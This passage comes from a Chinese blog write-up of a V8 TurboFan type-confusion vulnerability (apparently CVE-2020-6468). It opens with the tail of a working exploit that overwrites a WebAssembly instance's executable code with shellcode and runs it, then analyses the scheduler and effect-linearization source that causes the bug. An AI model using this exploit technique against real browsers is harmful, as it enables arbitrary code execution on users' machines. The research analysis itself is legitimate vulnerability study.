WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x68n;</span><br><span class="line">print(&quot;[+] wasm_shellcode_ptr_addr=0x&quot; + wasm_shellcode_ptr_addr.toString(16));</span><br><span class="line"></span><br><span class="line">/*%DebugPrint(wasmInstance);</span><br><span class="line">%DebugPrint(oob);</span><br><span class="line">%DebugPrint(obj_arr);</span><br><span class="line">%DebugPrint(float64arr);</span><br><span class="line">%DebugPrint(arr_buf);</span><br><span class="line">%SystemBreak();</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">oob[0x1e] = i2f64(0x100);</span><br><span class="line">oob[0x1f] = i2f64(wasm_shellcode_ptr_addr);</span><br><span class="line">var adv = new DataView(arr_buf);</span><br><span class="line">var wasm_shellcode_addr = adv.getBigUint64(0,true);</span><br><span class="line"></span><br><span class="line">print(&#x27;[+] wasm_shellcode_addr=0x&#x27; + wasm_shellcode_addr.toString(16));</span><br><span class="line">oob[0x1f] = i2f64(wasm_shellcode_addr);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
<p>执行效果<br><img src="https://i.loli.net/2021/07/14/yY6Wr2sVh49mLn1.png" alt="image.png"></p>
<h2 id="0x04-补充"><a href="#0x04-补充" class="headerlink" title="0x04 补充"></a>0x04 补充</h2><p>回顾V8 schedule阶段的设计，可以发现对于每一个控制流节点的添加，都增加了<code>DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</code>的检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void ConnectThrow(Node* thr) &#123;</span><br><span class="line">  Node* throw_control = NodeProperties::GetControlInput(thr);</span><br><span class="line">  BasicBlock* throw_block = FindPredecessorBlock(throw_control);</span><br><span class="line">  TraceConnect(thr, throw_block, nullptr);</span><br><span class="line">  schedule_-&gt;AddThrow(throw_block, thr);</span><br><span class="line">&#125;</span><br><span class="line">void Schedule::AddThrow(BasicBlock* block, Node* input) &#123;</span><br><span class="line">  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span><br><span class="line">  block-&gt;set_control(BasicBlock::kThrow);</span><br><span class="line">  SetControlInput(block, input);</span><br><span class="line">  if (block != end()) AddSuccessor(block, end());</span><br><span class="line">&#125;</span><br><span class="line">void Schedule::SetControlInput(BasicBlock* block, Node* node) &#123;</span><br><span class="line">  block-&gt;set_control_input(node);</span><br><span class="line">  SetBlockForNode(block, node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Schedule::SetBlockForNode(BasicBlock* block, Node* node) &#123;</span><br><span class="line">  if (node-&gt;id() &gt;= nodeid_to_block_.size()) &#123;</span><br><span class="line">    nodeid_to_block_.resize(node-&gt;id() + 1);</span><br><span class="line">  &#125;</span><br><span class="line">  nodeid_to_block_[node-&gt;id()] = block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是因为要跳出一个基本块，只能是通过一个出口出去<br><img src="https://i.loli.net/2021/08/05/C8tWucegvLwzZTH.png" alt="image.png"><br>导致DCHECK未通过的阶段发生在<code>EffectControlLinearizationPhase</code>，我们来分析一下这个阶段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">struct EffectControlLinearizationPhase &#123;</span><br><span class="line">  DECL_PIPELINE_PHASE_CONSTANTS(EffectLinearization)</span><br><span class="line"></span><br><span class="line">  void Run(PipelineData* data, Zone* temp_zone) &#123;</span><br><span class="line">    &#123;</span><br><span class="line">      // The scheduler requires the graphs to be trimmed, so trim now.</span><br><span class="line">      // TODO(jarin) Remove the trimming once the scheduler can handle untrimmed</span><br><span class="line">      // graphs.</span><br><span class="line">      GraphTrimmer trimmer(temp_zone, data-&gt;graph());</span><br><span class="line">      NodeVector roots(temp_zone);</span><br><span class="line">      data-&gt;jsgraph()-&gt;GetCachedNodes(&amp;roots);</span><br><span class="line">      trimmer.TrimGraph(roots.begin(), roots.end());</span><br><span class="line"></span><br><span class="line">      // Schedule the graph without node splitting so that we can</span><br><span class="line">      // fix the effect and control flow for nodes with low-level side</span><br><span class="line">      // effects (such as changing representation to tagged or</span><br><span class="line">      // &#x27;floating&#x27; allocation regions.)</span><br><span class="line">      Schedule* schedule = Scheduler::ComputeSchedule(</span><br><span class="line">          temp_zone, data-&gt;graph(), Scheduler::kTempSchedule,</span><br><span class="line">          &amp;data-&gt;info()-&gt;tick_counter());</span><br><span class="line">      TraceScheduleAndVerify(data-&gt;info(), data, schedule,</span><br><span class="line">                             &quot;effect linearization schedule&quot;);</span><br><span class="line"></span><br><span class="line">      MaskArrayIndexEnable mask_array_index =</span><br><span class="line">          (data-&gt;info()-&gt;GetPoisoningMitigationLevel() !=</span><br><span class="line">           PoisoningMitigationLevel::kDontPoison)</span><br><span class="line">              ? MaskArrayIndexEnable::kMaskArrayIndex</span><br><span class="line">              : MaskArrayIndexEnable::kDoNotMaskArrayIndex;</span><br><span class="line">      // Post-pass for wiring the control/effects</span><br><span class="line">      // - connect allocating representation changes into the control&amp;effect</span><br><span class="line">      //   chains and lower them,</span><br><span class="line">      // - get rid of the region markers,</span><br><span class="line">      // - introduce effect phis and rewire effects to get SSA again.</span><br><span class="line">      LinearizeEffectControl(data-&gt;jsgraph(), schedule, temp_zone,</span><br><span class="line">                             data-&gt;source_positions(), data-&gt;node_origins(),</span><br><span class="line">                             mask_array_index, MaintainSchedule::kDiscard);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">      // The &#123;EffectControlLinearizer&#125; might leave &#123;Dead&#125; nodes behind, so we</span><br><span class="line">      // run &#123;DeadCodeElimination&#125; to prune these parts of the graph.</span><br><span class="line">      // Also, the following store-store elimination phase greatly benefits from</span><br><span class="line">      // doing a common operator reducer and dead code elimination just before</span><br><span class="line">      // it, to eliminate conditional deopts with a constant condition.</span><br><span class="line">      GraphReducer graph_reducer(temp_zone, data-&gt;graph(),</span><br><span class="line">                                 &amp;data-&gt;info()-&gt;tick_counter(),</span><br><span class="line">                                 data-&gt;jsgraph()-&gt;Dead());</span><br><span class="line">      DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">                                                data-&gt;common(), temp_zone);</span><br><span class="line">      CommonOperatorReducer common_reducer(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">                                           data-&gt;broker(), data-&gt;common(),</span><br><span class="line">                                           data-&gt;machine(), temp_zone);</span><br><span class="line">      AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line">      AddReducer(data, &amp;graph_reducer, &amp;common_reducer);</span><br><span class="line">      graph_reducer.ReduceGraph();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中的<code>Scheduler::ComputeSchedule</code>生成了中间代码，这个过程中BuildCFG中的<code>ConnectBlocks</code>操作触发了DCHECK<br>当出现多个Throw时，由于他们属于同一个基本块<br><img src="https://i.loli.net/2021/08/05/1q58ARklfBZnHzV.png" alt="image.png"><br>遍历节点是从End开始进行广度优先搜索的，因此134:Throw先遍历到，经过AddThrow以后，134被归到到了73:Call所在的Block中，同时block中保留了control_指针指向134，接下来，遇到173:Throw，再一次来到AddThrow，由于在Release版本中没有DCHECK，因此程序继续执行，block中的control_指针被覆盖为173:Throw，同时,173:Throw也归到73:Call所在的Block中。与正常的情况比起来，两者的结果<em>唯一的不同点在于134:Throw被归到了73：Call的Block中</em>。<br>在<code>effect linearization schedule</code>阶段生成完成的中间代码被传入<code>LinearizeEffectControl</code>，该阶段主要调用<code>EffectControlLinearizer::Run</code>，用于优化一些不必要的Effect链。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void EffectControlLinearizer::Run() &#123;</span><br><span class="line">  BlockEffectControlMap block_effects(temp_zone());</span><br><span class="line">  ZoneVector&lt;PendingEffectPhi&gt; pending_effect_phis(temp_zone());</span><br><span class="line">  ZoneVector&lt;BasicBlock*&gt; pending_block_controls(temp_zone());</span><br><span class="line">  NodeVector inputs_buffer(temp_zone());</span><br><span class="line"></span><br><span class="line">  // TODO(rmcilroy) We should not depend on having rpo_order on schedule, and</span><br><span class="line">  // instead just do our own RPO walk here.</span><br><span class="line">  for (BasicBlock* block : *(schedule()-&gt;rpo_order())) &#123;</span><br><span class="line">    gasm()-&gt;Reset(block);</span><br><span class="line"></span><br><span class="line">    BasicBlock::iterator instr = block-&gt;begin();</span><br><span class="line">    BasicBlock::iterator end_instr = block-&gt;end();</span><br><span class="line"></span><br><span class="line">    // The control node should be the first.</span><br><span class="line">    Node* control = *instr;</span><br><span class="line">............................</span><br><span class="line"></span><br><span class="line">    // Process the ordinary instructions.</span><br><span class="line">    for (; instr != end_instr; instr++) &#123;</span><br><span class="line">      Node* node = *instr;</span><br><span class="line">      ProcessNode(node, &amp;frame_state);</span><br><span class="line">    &#125;</span><br><span class="line">    block = gasm()-&gt;FinalizeCurrentBlock(block);</span><br><span class="line"></span><br><span class="line">    switch (block-&gt;control()) &#123;</span><br><span class="line">      case BasicBlock::kGoto:</span><br><span class="line">      case BasicBlock::kNone:</span><br><span class="line">        break;</span><br><span class="line">      case BasicBlock::kCall:</span><br><span class="line">      case BasicBlock::kTailCall:</span><br><span class="line">      case BasicBlock::kSwitch:</span><br><span class="line">      case BasicBlock::kReturn:</span><br><span class="line">      case BasicBlock::kDeoptimize:</span><br><span class="line">      case BasicBlock::kThrow:</span><br><span class="line">      case BasicBlock::kBranch:</span><br><span class="line">        UpdateEffectControlForNode(block-&gt;control_input());</span><br><span class="line">        gasm()-&gt;UpdateEffectControlWith(block-&gt;control_input());</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">........................</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>ProcessNode</code>代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void EffectControlLinearizer::ProcessNode(Node* node, Node** frame_state) &#123;</span><br><span class="line">  SourcePositionTable::Scope scope(source_positions_,</span><br><span class="line">                                   source_positions_-&gt;GetSourcePosition(node));</span><br><span class="line">  NodeOriginTable::Scope origin_scope(node_origins_, &quot;process node&quot;, node);</span><br><span class="line"></span><br><span class="line">  // If basic block is unreachable after this point, update the node&#x27;s effect</span><br><span class="line">  // and control inputs to mark it as dead, but don&#x27;t process further.</span><br><span class="line">  if (gasm()-&gt;effect() == jsgraph()-&gt;Dead()) &#123;</span><br><span class="line">    UpdateEffectControlForNode(node);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">.............................</span><br><span class="line">  if (node-&gt;opcode() == IrOpcode::kUnreachable) &#123;</span><br><span class="line">    // Break the effect chain on &#123;Unreachable&#125; and reconnect to the graph end.</span><br><span class="line">    // Mark the following code for deletion by connecting to the &#123;Dead&#125; node.</span><br><span class="line">    gasm()-&gt;ConnectUnreachableToEnd();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中注意到当遍历到<code>Unreachable</code>节点时，会调用<code>ConnectUnreachableToEnd</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void GraphAssembler::ConnectUnreachableToEnd() &#123;</span><br><span class="line">  DCHECK_EQ(effect()-&gt;opcode(), IrOpcode::kUnreachable);</span><br><span class="line">  Node* throw_node = graph()-&gt;NewNode(common()-&gt;Throw(), effect(), control());</span><br><span class="line">  NodeProperties::MergeControlToEnd(graph(), common(), throw_node);</span><br><span class="line">  effect_ = control_ = mcgraph()-&gt;Dead();</span><br><span class="line">  if (block_updater_) &#123;</span><br><span class="line">    block_updater_-&gt;AddThrow(throw_node);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数创建了一个新的Throw节点，并且且节点的control和effect继承自前面，该节点是之前<code>424:CheckedTaggedToTaggedSigned</code> Lower以后的节点<br><img src="https://i.loli.net/2021/08/05/OmBjcozHAC1LXKl.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/graph-assembler.cc</span><br><span class="line">   817 &#125;</span><br><span class="line">   818 </span><br><span class="line">   819 void GraphAssembler::ConnectUnreachableToEnd() &#123;</span><br><span class="line">   820   DCHECK_EQ(effect()-&gt;opcode(), IrOpcode::kUnreachable);</span><br><span class="line">   821   Node* throw_node = graph()-&gt;NewNode(common()-&gt;Throw(), effect(), control());</span><br><span class="line"> ► 822   NodeProperties::MergeControlToEnd(graph(), common(), throw_node);</span><br><span class="line">   823   effect_ = control_ = mcgraph()-&gt;Dead();</span><br><span class="line">   824   if (block_updater_) &#123;</span><br><span class="line">   825     block_updater_-&gt;AddThrow(throw_node);</span><br><span class="line">   826   &#125;</span><br><span class="line">   827 &#125;</span><br><span class="line">pwndbg&gt; p control_-&gt;id()</span><br><span class="line">$31 = 479</span><br><span class="line">pwndbg&gt; p effect_-&gt;id()</span><br><span class="line">$32 = 423</span><br></pre></td></tr></table></figure>
<p>同时我们注意到<code>effect_ = control_ = mcgraph()-&gt;Dead();</code>清空了effect_和control_，那么接下来遍历到的节点将不存在effect_和control_。480:Throw是当前block的最后一个节点，因此遍历结束，来到switch中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">................</span><br><span class="line">      case BasicBlock::kThrow:</span><br><span class="line">      case BasicBlock::kBranch:</span><br><span class="line">        UpdateEffectControlForNode(block-&gt;control_input());</span><br><span class="line">        gasm()-&gt;UpdateEffectControlWith(block-&gt;control_input());</span><br><span class="line">        break;</span><br><span class="line">..............</span><br></pre></td></tr></table></figure>
<p>首先会调用<code>UpdateEffectControlForNode</code>函数更新480:Throw的control</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void EffectControlLinearizer::UpdateEffectControlForNode(Node* node) &#123;</span><br><span class="line">  // If the node takes an effect, replace with the current one.</span><br><span class="line">  if (node-&gt;op()-&gt;EffectInputCount() &gt; 0) &#123;</span><br><span class="line">    DCHECK_EQ(1, node-&gt;op()-&gt;EffectInputCount());</span><br><span class="line">    NodeProperties::ReplaceEffectInput(node, gasm()-&gt;effect());</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    // New effect chain is only started with a Start or ValueEffect node.</span><br><span class="line">    DCHECK(node-&gt;op()-&gt;EffectOutputCount() == 0 ||</span><br><span class="line">           node-&gt;opcode() == IrOpcode::kStart);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Rewire control inputs.</span><br><span class="line">  for (int i = 0; i &lt; node-&gt;op()-&gt;ControlInputCount(); i++) &#123;</span><br><span class="line">    NodeProperties::ReplaceControlInput(node, gasm()-&gt;control(), i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是上一步已经将control和effect设置为Dead()了，因此<code>480:Throw</code>的control和effect都设置为了Dead。再回到本节的最开始的问题来看，两个Throw节点，134和173，它们都属于同一个基本块，且位于Unreachable的efrfect链中，但是AddThrow中<code>SetControlInput</code>操作是会更新的，导致block-&gt;control_input()的值是最后一次更新上去的节点值，即173:Throw，由于该节点的control和effect在<code>EffectControlLinearizer::ProcessNode</code>中都被设置为Dead，后续会在<code>DeadCodeElimination</code>中会被消除掉。优化以后的图中虽然仍有两个Throw节点，但此时它们之间不再是属于同一个基本块了，没有冲突。<br><img src="https://i.loli.net/2021/08/05/wRX4uJnqiC6gaML.png" alt="image.png"><br>从以上的分析来看，整个流程都是需要保证一个基本块中只有一个control_input()，如果有多个，那么将只会处理最后更新上去的那个。这是解释了为什么在AddXXXX时需要增加DCHECK事先检查block是否已经存在control_input。因此，134:Throw虽然在Unreachable的effect链中，但是逃过了被消除的风险，一直到最后都能保留在IR图中。<br>使得这些普通节点都可以”抄近路”来到外层的基本块中。<br><img src="https://i.loli.net/2021/08/05/j9qn7A652sEmWZf.png" alt="image.png"><br>然而469:DeoptimizeUnless抄不了近路，因为有Merge节点。</p>
<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本漏洞是因为LOOP优化时，通过某种特殊的条件，将Terminate节点换成Throw节点，使得Terminate节点以”换汤不换药”的形式保留在了IR图中，一直到最后一个阶段，其仍然被保留。导致最后的schedule阶段划分基本块时可以”抄近路”，使得原本位于内联中的基本块中的节点分到了外部的基本块中，因为外部基本块总是先执行到，这也就是导致了对一个对象进行操作时，可以先写数据，再进行类型检查。</p>
<h2 id="0x06-感想"><a href="#0x06-感想" class="headerlink" title="0x06 感想"></a>0x06 感想</h2><p>通过本次漏洞复现，加深了对V8的IR图的理解，同时也明白了V8是如何根据图来划分基本代码块的，对V8整个优化阶段有了实践性的认识，收获很大。同时感慨漏洞发现人的高明，这个POC蕴含的知识是如此的复杂，看来还得再继续深入学习。</p>
<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a target="_blank" rel="noopener" href="https://kiprey.github.io/2021/02/CVE-2020-6468/">CVE-2020-6468 分析</a><br><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1Z9iIHojKDrXvZ27gRX51UxHD-bKf1QcPzSijntpMJBM/edit#slide=id.p">Turbofan IR</a><br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/57463700/meaning-of-merge-phi-effectphi-and-dead-in-v8-terminology">Meaning of merge, phi, effectphi and dead in v8 terminology</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/analogous_love/article/details/53333443">gdb多线程下禁止线程切换</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240011#h3-3">V8 TurboFan 生成图简析</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/dashuniuniu/article/details/52224882">构造Dominator Tree以及Dominator Frontier</a><br><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1076708">Issue 1076708: OOB read&#x2F;write in v8</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
              <a href="/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/07/07/CVE-2020-9802/" rel="prev" title="CVE-2020-9802 JSC CSE漏洞分析">
      <i class="fa fa-chevron-left"></i> CVE-2020-9802 JSC CSE漏洞分析
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/08/17/issue-926651/" rel="next" title="ISSUE 926651漏洞分析">
      ISSUE 926651漏洞分析 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Terminate%E8%8A%82%E7%82%B9%E7%9A%84%E7%94%9F%E6%88%90"><span class="nav-number">1.1.</span> <span class="nav-text">Terminate节点的生成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DeadCode"><span class="nav-number">1.2.</span> <span class="nav-text">DeadCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unreachable%E8%8A%82%E7%82%B9%E7%9A%84%E7%94%9F%E6%88%90"><span class="nav-number">1.3.</span> <span class="nav-text">Unreachable节点的生成</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%90%8E%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">2.2.</span> <span class="nav-text">修复后的情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">POC分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98"><span class="nav-number">2.4.</span> <span class="nav-text">其他问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.5.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E8%A1%A5%E5%85%85"><span class="nav-number">3.</span> <span class="nav-text">0x04 补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%B0%8F%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">0x05 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%84%9F%E6%83%B3"><span class="nav-number">5.</span> <span class="nav-text">0x06 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">0x07 参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ha1vk</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">234</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">147</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ha1vk</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
